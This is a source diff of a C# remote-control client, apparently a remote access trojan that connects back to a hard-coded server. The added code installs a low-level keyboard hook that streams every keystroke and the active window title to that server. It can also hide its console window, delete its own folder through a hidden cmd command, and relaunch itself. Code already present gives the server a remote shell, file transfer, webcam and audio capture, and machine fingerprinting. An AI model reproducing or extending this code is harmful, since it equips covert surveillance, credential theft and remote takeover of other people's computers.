@@ -1,4 +1,5 @@
-﻿using System;
+﻿#region NAMESPACE IMPORTS
+using System;
 using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Drawing2D;
@@ -26,33 +27,55 @@ using Microsoft.CodeAnalysis.CSharp;
 using Microsoft.CodeAnalysis.Emit;
 using System.Runtime.Loader;
 using System.Runtime.ExceptionServices;
+using System.Reflection.Emit;
+using System.Runtime.Intrinsics.Arm;
+using System.Security.Cryptography;
+
+
+#endregion
 
 [assembly: log4net.Config.XmlConfigurator(Watch = true)]
 
 namespace Kontrol_2_Client
 {
-	public class Client
+	static class Settings
+    {
+#if DEBUG
+        public static string s_Ip = "192.168.0.85";
+        public static ushort s_Port = 7878;
+        public static bool s_SW_MODE = false;
+#else
+		public static string s_Ip = "127.0.0.1";
+        public static ushort s_Port = 7878;
+		public static bool s_SW_MODE = false;
+#endif
+    }
+
+    class Client
 	{
-		//interopt and dll handling stuff
-		[DllImport("user32.dll", CharSet = CharSet.Auto)]
-		private static extern Int32 SystemParametersInfo(UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);
+        #region COM HOOKS
+        //  Unmanaged COM hooks
+        [DllImport("user32.dll")]
+		static extern int GetAsyncKeyState(Int32 i);
+        [DllImport("user32.dll", CharSet = CharSet.Auto)]
+        static extern Int32 SystemParametersInfo(UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);
 
-		private static readonly UInt32 SPI_SETDESKWALLPAPER = 0x14;
-		private static readonly UInt32 SPIF_UPDATEINIFILE = 0x01;
-		private static readonly UInt32 SPIF_SENDWININICHANGE = 0x02;
+		static readonly UInt32 SPI_SETDESKWALLPAPER = 0x14;
+		static readonly UInt32 SPIF_UPDATEINIFILE = 0x01;
+		static readonly UInt32 SPIF_SENDWININICHANGE = 0x02;
 
-		public static void SetWallpaper(string path)
+		static void SetWallpaper(string path)
 		{
 			SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
 		}
-		private static WinEventDelegate dele = null;
+		static WinEventDelegate dele = null;
 		delegate void WinEventDelegate(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime);
 
 		[DllImport("user32.dll")]
 		static extern IntPtr SetWinEventHook(uint eventMin, uint eventMax, IntPtr hmodWinEventProc, WinEventDelegate lpfnWinEventProc, uint idProcess, uint idThread, uint dwFlags);
 
-		private const uint WINEVENT_OUTOFCONTEXT = 0;
-		private const uint EVENT_SYSTEM_FOREGROUND = 3;
+		const uint WINEVENT_OUTOFCONTEXT = 0;
+		const uint EVENT_SYSTEM_FOREGROUND = 3;
 
 		[DllImport("user32.dll")]
 		static extern IntPtr GetForegroundWindow();
@@ -60,17 +83,14 @@ namespace Kontrol_2_Client
 		[DllImport("user32.dll")]
 		static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
 
-		private static string GetActiveWindowTitle()
+		static string GetActiveWindowTitle()
 		{
 			const int nChars = 256;
 			IntPtr handle = IntPtr.Zero;
 			StringBuilder Buff = new StringBuilder(nChars);
 			handle = GetForegroundWindow();
 
-			if (GetWindowText(handle, Buff, nChars) > 0)
-			{
-				return Buff.ToString();
-			}
+			if (GetWindowText(handle, Buff, nChars) > 0) return Buff.ToString();
 			return null;
 		}
 
@@ -87,12 +107,12 @@ namespace Kontrol_2_Client
 			GW_ENABLEDPOPUP = 6
 		}
 		[StructLayout(LayoutKind.Sequential)]
-		public struct POINTAPI
+		struct POINTAPI
 		{
 			public int x;
 			public int y;
 		}
-		public struct CURSORINFO
+		struct CURSORINFO
 		{
 			public Int32 cbSize;
 			public Int32 flags;
@@ -100,23 +120,35 @@ namespace Kontrol_2_Client
 			public POINTAPI ptScreenPos;
 		}
 		[DllImport("user32.dll", EntryPoint = "SetCursorPos")]
-		private static extern bool SetCursorPos(int x, int y);
+		static extern bool SetCursorPos(int x, int y);
 		[DllImport("user32.dll")]
-		public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);
-		public const int MOUSEEVENTF_LEFTDOWN = 0x02;
-		private const int MOUSEEVENTF_RIGHTDOWN = 0x08; 
-		[DllImport("user32.dll")]
-		public static extern bool GetCursorInfo(out CURSORINFO pci);
-		public const int MOUSEEVENTF_LEFTUP = 0x04;
-		private const int MOUSEEVENTF_RIGHTUP = 0x10;
-		[DllImport("user32.dll")]
-		public static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);
+		static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);
+		const int MOUSEEVENTF_LEFTDOWN = 0x02;
+		const int MOUSEEVENTF_RIGHTDOWN = 0x08;
+        const int MOUSEEVENTF_MOVE = 0x0001;
+        static void Drag(int startX, int startY, int endX, int endY)
+        {
+			Console.WriteLine("DRAG!");
+            endX = endX - startX;
+            endY = endY - startY;
+            SetCursorPos(startX, startY);
+            mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
+            mouse_event(MOUSEEVENTF_MOVE, endX, endY, 0, 0);
+            mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
+        }
+        [DllImport("user32.dll")]
+		static extern bool GetCursorInfo(out CURSORINFO pci);
+		const int MOUSEEVENTF_LEFTUP = 0x04;
+		const int MOUSEEVENTF_RIGHTUP = 0x10;
+
+        [DllImport("user32.dll")]
+		static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);
 		[DllImport("user32.dll", SetLastError = true)]
 		static extern IntPtr GetWindow(IntPtr hWnd, GetWindow_Cmd uCmd);
 		[DllImport("user32.dll", CharSet = CharSet.Auto)] static extern IntPtr SendMessage(IntPtr hWnd, UInt32 Msg, IntPtr wParam, IntPtr lParam);
-		private const int WM_COMMAND = 0x111;
+		const int WM_COMMAND = 0x111;
 		[DllImport("user32.dll", SetLastError = true)]
-		public static extern IntPtr FindWindowEx(IntPtr parentHandle, IntPtr childAfter, string className, string windowTitle);
+		static extern IntPtr FindWindowEx(IntPtr parentHandle, IntPtr childAfter, string className, string windowTitle);
 		[DllImport("user32.dll", SetLastError = false)]
 		static extern IntPtr GetDesktopWindow();
 		static IntPtr GetDesktopSHELLDLL_DefView()
@@ -127,16 +159,16 @@ namespace Kontrol_2_Client
 			var hProgman = FindWindow("Progman", "Program Manager");
 			var hDesktopWnd = GetDesktopWindow();
 
-			// If the main Program Manager window is found
+			//  If the main Program Manager window is found
 			if (hProgman != IntPtr.Zero)
 			{
-				// Get and load the main List view window containing the icons.
+				//  Get and load the main List view window containing the icons.
 				hShellViewWin = FindWindowEx(hProgman, IntPtr.Zero, "SHELLDLL_DefView", null);
 				if (hShellViewWin == IntPtr.Zero)
 				{
-					// When this fails (picture rotation is turned ON, toggledesktop shell cmd used ), then look for the WorkerW windows list to get the
-					// correct desktop list handle.
-					// As there can be multiple WorkerW windows, iterate through all to get the correct one
+					//  When this fails (picture rotation is turned ON, toggledesktop shell cmd used ), then look for the WorkerW windows list to get the
+					//  correct desktop list handle.
+					//  As there can be multiple WorkerW windows, iterate through all to get the correct one
 					do
 					{
 						hWorkerW = FindWindowEx(hDesktopWnd, hWorkerW, "WorkerW", null);
@@ -149,48 +181,56 @@ namespace Kontrol_2_Client
 		[DllImport("kernel32.dll")]
 		static extern IntPtr GetConsoleWindow();
 		[DllImport("user32.dll")]
-		public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-		private const byte SW_SHOW = 1;
-		private const byte SW_HIDE = 0;
-		public const Int32 CURSOR_SHOWING = 0x00000001;
-		private static WinEventDelegate dale;
+		static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+		const byte SW_SHOW = 1, SW_HIDE = 0;
+		const Int32 CURSOR_SHOWING = 0x00000001;
 
-		//Forms
-		private static ChatForm cf = new ChatForm();
-		private static MainForm mf = new MainForm();
+		[DllImport("user32.dll")]
+		static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+		[DllImport("user32.dll")]
+		static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, int dwTheadId);
+        [DllImport("user32.dll")]
+        static extern bool UnhookWindowsHookEx(IntPtr hhk);
+        [DllImport("kernel32.dll")]
+		static extern IntPtr GetModuleHandle(string name);
 
-		//Global variables
-		private static int _ID = 0;
-		private static bool _DEBUG;
-		private static string[] configFile = File.ReadAllText(@".\conf.t").Split(';');
-		private static Socket _clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-		public static string ip = configFile[0];
-		public static ushort PORT = ushort.Parse(configFile[1]);
-		private static Process remoteShell;
-		private static StreamReader fromShell;
-		private static StreamWriter toShell;
-		private static StreamReader error;
-		private static byte fo_mode = 3; //3 = none, 0 = download, 1 = upload
-		private static string fo_path = string.Empty;
-		private static int fo_size = 0;
-		private static int fo_writeSize = 0;
-		private static byte[] fileBuffer;
-		private static FilterInfoCollection videoDevices;
-		private static VideoCaptureDevice videoSource;
-		private static Encoding uniEncoder = Encoding.Unicode;
-		private static WasapiLoopbackCapture internalSource = null;
-		private static WaveInEvent audioSource = null;
-		private static bool RemoteDekstop;
+		static IntPtr SetHook(LowLevelKeyboardProc proc)
+		{
+			var moduleHandle = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
+            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
+		}
 
-		//log4net
-		private static readonly log4net.ILog log = log4net.LogManager.GetLogger(MethodBase.GetCurrentMethod().DeclaringType);
+		delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+		static IntPtr HookCallBack(int nCode, IntPtr wParam, IntPtr lParam)
+		{
+			//  Terminate the message loop
+			if (!runKeyLogger) Application.Exit();
 
-		public static void WinEventProc(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime)
+            if (nCode >= 0 && wParam == (IntPtr) WM_KEYDOWN)
+            {
+                int vkCode = Marshal.ReadInt32(lParam);
+				Send($"klg\n{vkCode}\n{DateTime.Now}\n{GetActiveWindowTitle()}");
+			}
+
+			return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
+		}
+
+		const int WH_KEYBOARD_LL = 13;
+		static int WM_KEYDOWN = 0x0100;
+		static IntPtr klHook = IntPtr.Zero;
+		static LowLevelKeyboardProc llkProcedure = HookCallBack;
+
+        #endregion
+
+		#region LOGGING (Log4Net)
+		static readonly log4net.ILog log = log4net.LogManager.GetLogger(MethodBase.GetCurrentMethod().DeclaringType);
+
+		static void WinEventProc(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime)
 		{
 			if (_clientSocket.Connected)
 			{
 				Send("active_window\n" + _ID + "\n" + GetActiveWindowTitle());
-				//printline("Active window: " + GetActiveWindowTitle());
+				// printline("Active window: " + GetActiveWindowTitle());
 			}
 		}
 
@@ -200,76 +240,96 @@ namespace Kontrol_2_Client
 			if (!e.Exception.Message.StartsWith("No connection could be made because the target machine actively refused it."))
 				log.Error(e.Exception.Message + "\n\t" + e.Exception.StackTrace);
 		}
+        #endregion
 
-		[STAThread]
+        #region GLOBAL FIELDS
+        static int _ID = 0;
+        static Socket _clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+        static Process remoteShell;
+        static StreamReader fromShell;
+        static StreamWriter toShell;
+        static StreamReader error;
+        static byte fo_mode = 3; // 3 = none, 0 = download, 1 = upload
+        static string fo_path = string.Empty;
+        static int fo_size = 0, fo_writeSize = 0;
+        static byte[] fileBuffer;
+        static FilterInfoCollection videoDevices;
+        static VideoCaptureDevice videoSource;
+        static Encoding uniEncoder = Encoding.Unicode;
+        static WasapiLoopbackCapture internalSource = null;
+        static WaveInEvent audioSource = null;
+        static bool remoteDesktop, runKeyLogger = false;
+        #endregion
+
+        [STAThread]
 		static void Main(string[] args)
 		{
-			//AppDomain.CurrentDomain.FirstChanceException += FirstChanceHandler;
+			//  WinTitle Hook Thread
 			new Thread(() =>
 			{
 				dele = new WinEventDelegate(WinEventProc);
 				IntPtr m_hhook = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, IntPtr.Zero, dele, 0, 0, WINEVENT_OUTOFCONTEXT);
 			}).Start();
 
-			isDebug();
 			var handle = GetConsoleWindow();
+			if (!Settings.s_SW_MODE) ShowWindow(handle, SW_SHOW);
+			else ShowWindow(handle, SW_HIDE);
 
-			// Hide
-			if (configFile[2] == "show")
-				ShowWindow(handle, SW_SHOW);
-			else if (configFile[2] == "hide")
-				ShowWindow(handle, SW_HIDE);
+            Console.SetWindowSize(50, 10);
 
+            Connect();
+            RequestLoop();
+        }
 
-			//Application.EnableVisualStyles();
-			//Application.Run(mf);
-			Execute();
-		}
-
-		public static void Execute()
+        #region DEBUG BULLSHIT
+        static void printline(string text)
 		{
-			Connect();
-			RequestLoop();
-		}
-
-		[Conditional("DEBUG")]
-		static void isDebug()
-		{
-			_DEBUG = true;
-		}
-
-		static void printline(string text)
-		{
-			if (_DEBUG) Console.WriteLine(text);
+#if DEBUG 
+			Console.WriteLine(text);
+#endif
 		}
 		static void printline()
-		{
-			if (_DEBUG) Console.WriteLine();
-		}
-		static void printline(string text, params object?[]? args)
-		{
-			text = string.Format(text, args);
-			if (_DEBUG) Console.WriteLine(text);
-		}
-		static void printline(object? obj)
-		{
-			if (_DEBUG) Console.WriteLine(obj.ToString());
-		}
-		static void print(string text)
-		{
-			if (_DEBUG) Console.Write(text);
-		}
-		static void print(string text, params object?[]? args)
-		{
-			text = string.Format(text, args);
-			if (_DEBUG) Console.Write(text);
-		}
-		static void print(object? obj)
-		{
-			if (_DEBUG) Console.Write(obj.ToString());
-		}
+        {
+#if DEBUG
+            Console.WriteLine();
+#endif
+        }
+        static void printline(string text, params object?[]? args)
+        {
+#if DEBUG
+            text = string.Format(text, args);
+			Console.WriteLine(text);
+#endif
+        }
+        static void printline(object? obj)
+        {
+#if DEBUG
+            Console.WriteLine(obj.ToString());
+#endif
+        }
+        static void print(string text)
+        {
+#if DEBUG
+            Console.Write(text);
+#endif
+        }
+        static void print(string text, params object?[]? args)
+        {
+#if DEBUG
+            text = string.Format(text, args);
+			Console.Write(text);
+#endif
+        }
+        static void print(object? obj)
+        {
+#if DEBUG
+            Console.Write(obj.ToString());
+#endif
+        }
+        #endregion
 
-		private static void Connect()
+        #region SERVER & SOCKET
+        static void Connect()
 		{
 			int attempts = 0;
 
@@ -279,22 +339,22 @@ namespace Kontrol_2_Client
 				{
 					attempts++;
 					print("\rConnection attempt {0}", attempts);
-					_clientSocket.Connect(IPAddress.Parse(ip), PORT);
+					_clientSocket.Connect(IPAddress.Parse(Settings.s_Ip), Settings.s_Port);
 				}
 				catch (SocketException)
 				{
-					//Console.Clear();
+					// Console.Clear();
 				}
 			}
 
-			//Console.Clear();
+			// Console.Clear();
 			printline("\nConnected!");
 		}
 
-		//Reciving commands from the server
-		private static void RequestLoop()
+		// Reciving commands from the server
+		static void RequestLoop()
 		{
-			while (true)
+			while (_clientSocket.Connected)
 			{
 				try
 				{
@@ -302,52 +362,111 @@ namespace Kontrol_2_Client
 				}
 				catch (Exception ex)
 				{
-					//MessageBox.Show(ex.Message + "\n" + ex.StackTrace);
-					_clientSocket.Shutdown(SocketShutdown.Both);
-					_clientSocket.Close();
-					_clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-					if (videoSource != null)
-					{
-						videoSource.SignalToStop();
-						videoSource.NewFrame -= new NewFrameEventHandler(videoSource_NewFrame);
-						videoSource = null;
-					}
-					if (audioSource != null)
-					{
-						audioSource.StopRecording(); 
-					}
-					Connect();
-					RequestLoop();
+					// MessageBox.Show(ex.Message + "\n" + ex.StackTrace);
+					Reconnect();
 				}
 			}
 		}
 
-		private static void RecieveResponse()
+		static void Reconnect()
+        {
+			try
+            {
+                _clientSocket.Shutdown(SocketShutdown.Both);
+                _clientSocket.Close();
+            } 
+			catch { }
+            _clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+            if (videoSource != null)
+            {
+                videoSource.SignalToStop();
+                videoSource.NewFrame -= new NewFrameEventHandler(videoSource_NewFrame);
+                videoSource = null;
+            }
+            if (audioSource != null) audioSource.StopRecording();
+            Connect();
+            RequestLoop();
+        }
+        #endregion
+
+        #region COMMAND PROCESSING
+        static void RecieveResponse()
 		{
 			byte[] buffer = new byte[2048];
 			int recieved = _clientSocket.Receive(buffer, SocketFlags.None);
 			if (recieved == 0) return;
-			byte[] data = new byte[recieved];
-			Array.Copy(buffer, data, recieved);
-			//string header = Encoding.Unicode.GetString(data, 0, 4);
+			byte[] recBuf = new byte[recieved];
+			Array.Copy(buffer, recBuf, recieved);
 			
-			new Thread(() => //Literally the laziest but quickest way to make this multithreaded, it works so i dont care!!! 
-			{
-				if (true)
+			new Thread(() => // Literally the laziest but quickest way to make this multithreaded, it works so i dont care!!! 
+            {
+				if (recBuf[0] == 0xFE)
+                {
+                    switch (recBuf[1])
+                    {
+						// Remote Desktop
+                        case 0xF1:
+                            byte[] scBytes = recBuf.Skip(3).ToArray();
+							
+							// Remote Desktop Operation
+							switch (recBuf[2])
+                            {
+								// Mouse Click
+								case 0xA0:
+                                    // The common size for an int32 is 4 bytes so I can hard code this
+                                    byte[] xBytes = new byte[4];
+									byte[] yBytes = new byte[4];
+
+									Buffer.BlockCopy(recBuf, 4, xBytes, 0, 4);
+                                    Buffer.BlockCopy(recBuf, 8, yBytes, 0, 4);
+
+									int x = BitConverter.ToInt32(xBytes);
+									int y = BitConverter.ToInt32(yBytes);
+
+									Console.WriteLine($"MState: {recBuf[3]} MX: {x} MY: {y}");
+
+									// Mouse Button State
+									switch (recBuf[3])
+									{
+										// No button is held, release!
+										case 0xB0:
+                                            mouse_event(MOUSEEVENTF_LEFTUP, x, y, 0, 0);
+                                            mouse_event(MOUSEEVENTF_RIGHTUP, x, y, 0, 0);
+											//SetCursorPos(x, y);
+                                            break;
+										case 0xB1: // Left 
+											SetCursorPos(x, y);
+                                            mouse_event(MOUSEEVENTF_LEFTDOWN, x, y, 0, 0);
+                                            mouse_event(MOUSEEVENTF_LEFTUP, x, y, 0, 0);
+                                            break;
+										case 0xB2: // Right
+                                            SetCursorPos(x, y);
+                                            mouse_event(MOUSEEVENTF_RIGHTDOWN, x, y, 0, 0);
+                                            break;
+										case 0xB3: // Middle
+											break;
+									}
+                                    //SetCursorPos(int.Parse(xsplit[2]), int.Parse(xsplit[3]));
+                                    break;
+                            }
+                            break;
+                    }
+                    return;
+                }
+                if (true)
 				{
-					string cmd = Encoding.Unicode.GetString(data);
+					string cmd = Encoding.Unicode.GetString(recBuf);
 					try
 					{
 						cmd = Decrypt(cmd);
 					}
 					catch { }
-					if (fo_mode == -1) printline("Recieved: {0}", cmd); //empty check
 					if (cmd.StartsWith("getinfo-"))
 					{
 						try
 						{
 							var dev = new DeviceIdBuilder().AddMacAddress(true).AddMachineName().AddOsVersion().AddUserName();
-							_ID = int.Parse(cmd.Split('-')[1]); //get own id
+							_ID = int.Parse(cmd.Split('-')[1]); // get own id
 							string allinfo = string.Format("infoback-\n{0}\n{1}\n{2}\n{3}\n{4}\n{5}\n{6}\n{7}\n{8}", _ID, Environment.MachineName, DateTime.Now, Environment.OSVersion, Environment.UserName, dev, Assembly.GetExecutingAssembly().GetName().Version.ToString(), IsAdmin().ToString(), GetActiveWindowTitle());
 							Send(allinfo);
 						}
@@ -355,26 +474,6 @@ namespace Kontrol_2_Client
 						{
 							printline(ex.Message);
 						}
-					}
-					else if (cmd.StartsWith("chatform_open"))
-					{
-						cf.Show();
-						mf.Invoke(new MethodInvoker(delegate 
-						{
-							cf.Show();
-						}));
-					}
-					else if (cmd.StartsWith("chatform_close"))
-					{
-						mf.Invoke(new MethodInvoker(delegate
-						{
-							cf.Close();
-						}));
-						cf = new ChatForm();
-					}
-					else if (cmd.StartsWith("chat_in"))
-					{
-						cf.AppendText(cmd.Substring(cmd.IndexOf("@{msg}") + 6), cmd.Split('\n')[1]);
 					}
 					else if (cmd == "conditions_exit")
 					{
@@ -386,25 +485,37 @@ namespace Kontrol_2_Client
 					}
 					else if (cmd == "conditions_selfDestruct")
 					{
-						// :(
-						string args = string.Empty;
-						//string loc = Path.Join(AppDomain.CurrentDomain.BaseDirectory, AppDomain.CurrentDomain.FriendlyName + ".exe");
-						var psi = new ProcessStartInfo("cmd.exe", "/c" + "ping 127.0.0.1 && echo j | rmdir \"" + AppDomain.CurrentDomain.BaseDirectory + "\" /S /Q & cmd /k");
+                        //  this is with cmd
+                        var psi = new ProcessStartInfo("cmd.exe", "/c" + "ping 127.0.0.1 && echo j | rmdir \"" + AppDomain.CurrentDomain.BaseDirectory + "\" /S /Q | cmd /k");
 
-						args += "ping 127.0.0.1 > nul\n"; 
-						args += "echo j | rmdir \"";
-						args += AppDomain.CurrentDomain.BaseDirectory + "\" /S /Q";
+                        // var psi = new ProcessStartInfo("powershell.exe", $"ping 127.0.0.1 ; echo j ; rm '{AppDomain.CurrentDomain.BaseDirectory}\\' -r -force ; $host.enternestedprompt()");
 
-						psi.CreateNoWindow = true;
-						psi.UseShellExecute = true;
-						Process.Start(psi);
-						Environment.Exit(0);
+                        psi.CreateNoWindow = true;
+                        psi.UseShellExecute = true;
+                        psi.WindowStyle = ProcessWindowStyle.Hidden;
+                        psi.RedirectStandardError = false;
+                        psi.RedirectStandardOutput = false;
+                        Process.Start(psi);
+                        Environment.Exit(0);
+                    }
+                    else if (cmd == "conditions_reload")
+                    {
+						//  this is with cmd
+						// var psi = new ProcessStartInfo("cmd.exe", "/c" + "ping 127.0.0.1 && echo j | start \"" + Path.ChangeExtension(Assembly.GetEntryAssembly().Location, ".exe") + "\" | cmd /k");
 
-						Process.Start("cmd.exe", "/c" + args);
-					}
-					else if (cmd == "conditions_getSelfContainedAssemblies")
+						var psi = new ProcessStartInfo("powershell.exe", $"ping 127.0.0.1 ; echo j ; Start-Process -FilePath '{Path.ChangeExtension(Assembly.GetEntryAssembly().Location, ".exe")}'");
+
+                        psi.CreateNoWindow = true;
+                        psi.UseShellExecute = false;
+                        psi.WindowStyle = ProcessWindowStyle.Hidden;
+						psi.RedirectStandardError = false;
+                        psi.RedirectStandardOutput = false;
+                        Process.Start(psi);
+                        Environment.Exit(0);
+                    }
+                    else if (cmd == "conditions_getSelfContainedAssemblies")
 					{
-						string assemblies = "";
+						string assemblies = string.Empty;
 						foreach (string dll in Directory.GetFiles(AppDomain.CurrentDomain.BaseDirectory, "*.dll"))
 						{
 							try
@@ -432,8 +543,16 @@ namespace Kontrol_2_Client
 						Process.Start(psi);
 					}
 					else if (cmd == "system_sleep")
+                    {
+                        Application.SetSuspendState(PowerState.Hibernate, true, true); 
+                    }
+					else if (cmd.StartsWith("system_setWallpaper"))
 					{
-						Application.SetSuspendState(PowerState.Hibernate, true, true);
+						try
+                        {
+                            ThirdParty.Wallpaper.Set(new Uri(cmd.Split('\n')[1]), (ThirdParty.Wallpaper.Style) Convert.ToByte(cmd.Split('\n')[2]));
+						}
+						catch (Exception ex) { Console.WriteLine($"Err: {ex.Message}"); }
 					}
 					else if (cmd.StartsWith("cd"))
 					{
@@ -448,14 +567,10 @@ namespace Kontrol_2_Client
 								string file_infos = "";
 
 								foreach (string dir in dirs)
-								{
 									file_infos += (Path.GetFileName(Path.GetFullPath(dir).TrimEnd(Path.DirectorySeparatorChar)) + "&" + GetDirectorySize(dir) + "&" + Directory.GetCreationTimeUtc(dir).ToString() + "&" + dir + "&dir") + "\n";
-								}
 
 								foreach (string file in files)
-								{
 									dir_infos += (Path.GetFileName(file) + "&" + new FileInfo(file).Length.ToString() + "&" + File.GetCreationTimeUtc(file).ToString() + "&" + file + "&file") + "\n";
-								}
 								Send($"dir_info#{path}#" + file_infos + dir_infos);
 							}
 						}
@@ -468,14 +583,8 @@ namespace Kontrol_2_Client
 
 						foreach (DriveInfo drive in drives)
 						{
-							if (drive.IsReady)
-							{
-								infos += drive.Name + "&" + drive.TotalSize + "\n";
-							}
-							else
-							{
-								infos += drive.Name + "&" + "N/A\n";
-							}
+							if (drive.IsReady) infos += drive.Name + "&" + drive.TotalSize + "\n";
+							else infos += drive.Name + "&" + "N/A\n";
 						}
 						Send("drive_infos#" + infos);
 					}
@@ -499,13 +608,10 @@ namespace Kontrol_2_Client
 						switch (mode)
 						{
 							case "file_move":
-								//dest_attr = File.GetAttributes(dest);
 								dest_attr = File.GetAttributes(dest);
-								if ((dest_attr & FileAttributes.Directory) != FileAttributes.Directory) //destination path must be a directory!
-								{
+								if ((dest_attr & FileAttributes.Directory) != FileAttributes.Directory) // destination path must be a directory!
 									dest = Path.GetDirectoryName(dest);
-								}
-								if ((src_attr & FileAttributes.Directory) == FileAttributes.Directory) //same thing above but on the source
+								if ((src_attr & FileAttributes.Directory) == FileAttributes.Directory) // same thing above but on the source
 								{
 									dest = Path.Combine(dest, Path.GetFileName(src));
 									Directory.Move(src, dest);
@@ -517,56 +623,37 @@ namespace Kontrol_2_Client
 								}
 								break;
 							case "file_copy":
-								//dest_attr = File.GetAttributes(dest);
 								dest_attr = File.GetAttributes(dest);
-								if ((dest_attr & FileAttributes.Directory) != FileAttributes.Directory) //destination path must be a directory!
-								{
+								if ((dest_attr & FileAttributes.Directory) != FileAttributes.Directory) // destination path must be a directory!
 									dest = Path.GetDirectoryName(dest);
-								}
-								if ((src_attr & FileAttributes.Directory) == FileAttributes.Directory) //same thing above but on the source
+								if ((src_attr & FileAttributes.Directory) == FileAttributes.Directory) // same thing above but on the source
 								{
 									dest = Path.Combine(dest, Path.GetFileName(src));
 									if (Directory.Exists(dest))
-									{
 										dest += " - Copy";
-									}
 									MessageBox.Show(dest);
 									DirectoryCopy(src, dest, true);
 								}
 								else
 								{
 									if (File.Exists(Path.Combine(dest, Path.GetFileName(src))))
-									{
 										dest = Path.Combine(dest, Path.GetFileNameWithoutExtension(src) + " - Copy" + Path.GetExtension(src));
-									}
 									else
-									{
 										dest = Path.Combine(dest, Path.GetFileName(src));
-									}
 									File.Copy(src, dest);
 								}
 								Send("dir_refresh");
 								break;
 							case "file_delete":
 								if ((src_attr & FileAttributes.Directory) == FileAttributes.Directory)
-								{
 									Directory.Delete(src);
-								}
-								else
-								{
-									File.Delete(src);
-								}
+								else File.Delete(src);
 								Send("dir_refresh");
 								break;
 							case "file_rename":
 								if ((src_attr & FileAttributes.Directory) == FileAttributes.Directory)
-								{
 									Directory.Move(src, dest);
-								}
-								else
-								{
-									File.Move(src, dest);
-								}
+								else File.Move(src, dest);
 								Send("dir_refresh");
 								break;
 							case "file_open":
@@ -580,14 +667,8 @@ namespace Kontrol_2_Client
 								catch { }
 								break;
 							case "file_create":
-								if (Path.HasExtension(src))
-								{
-									File.Create(src);
-								}
-								else
-								{
-									Directory.CreateDirectory(src);
-								}
+								if (Path.HasExtension(src)) File.Create(src).Close();
+								else Directory.CreateDirectory(src);
 								Send("dir_refresh");
 								break;
 							case "file_download":
@@ -597,7 +678,6 @@ namespace Kontrol_2_Client
 								fileBuffer = new byte[fo_size];
 								fo_mode = 0;
 								Send("file_operation\nfile_beginUpload");
-								//DownloadFile(null, null);
 								break;
 							case "file_upload":
 								fo_path = src;
@@ -612,25 +692,6 @@ namespace Kontrol_2_Client
 								}
 								catch { }
 								fo_mode = 3;
-								/*NetworkStream ns = new NetworkStream(_clientSocket);
-								using (FileStream fs = new FileStream(fo_path, FileMode.Open, FileAccess.Read))
-								{
-									long fileSize = fs.Length;
-									long writeSize = 0;
-									int count = 0;
-									byte[] data = new byte[1024 ^ 8]; //8Kb buffer .. you might use a smaller size also.
-									while (writeSize < fileSize)
-									{
-										count = fs.Read(data, 0, data.Length);
-										if (count != data.Length)
-											Array.Resize(ref data, count);
-										ns.Write(data, 0, count);
-										//SendBytes(data);
-										writeSize += count;
-										Console.Title = writeSize.ToString();
-									}
-									ns.Flush();
-								}*/
 								break;
 							case "file_uploadFinished":
 								fo_mode = 3;
@@ -655,7 +716,7 @@ namespace Kontrol_2_Client
 
 								string proc_info = "process_info\n" + name + "\n" + pid + "\n" + responding + "\n" + title + "\n" + priority + "\n" + path;
 								Send(proc_info);
-								Thread.Sleep(10); //Let's be a good citizen to the network
+								Thread.Sleep(10); // Let's be a good citizen to the network bandwidth :)
 							}
 							catch { }
 						}
@@ -734,17 +795,23 @@ namespace Kontrol_2_Client
 
 							while ((tempBuf = fromShell.ReadLine()) != null && !remoteShell.HasExited)
 							{
-								sdata += tempBuf + "\r";
-								Send("cmd_out\n" + sdata);
+								//sdata += tempBuf + "\r";
+								//Send("cmd_out\n" + tempBuf);
+								byte[] header = { 0xFE, 0xF4 };
+								byte[] strBytes = Encoding.Unicode.GetBytes(tempBuf);
+                                byte[] data = new byte[strBytes.Length + 3];
+								Buffer.BlockCopy(header, 0, data, 0, 2);
+								Buffer.BlockCopy(strBytes, 0, data, 2, strBytes.Length);
+								SendBytes(data);
 								sdata = "";
-								Thread.Sleep(20); //Let's be friendly to the network bandwidth :)
+								Thread.Sleep(10); // Let's be a good citizen to the network bandwidth :)
 							}
 							while ((tempError = error.ReadLine()) != null && !remoteShell.HasExited)
 							{
 								edata += edata + tempError + "\r";
 								Send("cmd_out\n" + edata);
 								edata = "";
-								Thread.Sleep(20); //Let's be friendly to the network bandwidth :)
+								Thread.Sleep(20); // Let's be a good citizen to the network bandwidth :)
 							}
 						}
 						catch (Exception ex)
@@ -780,34 +847,24 @@ namespace Kontrol_2_Client
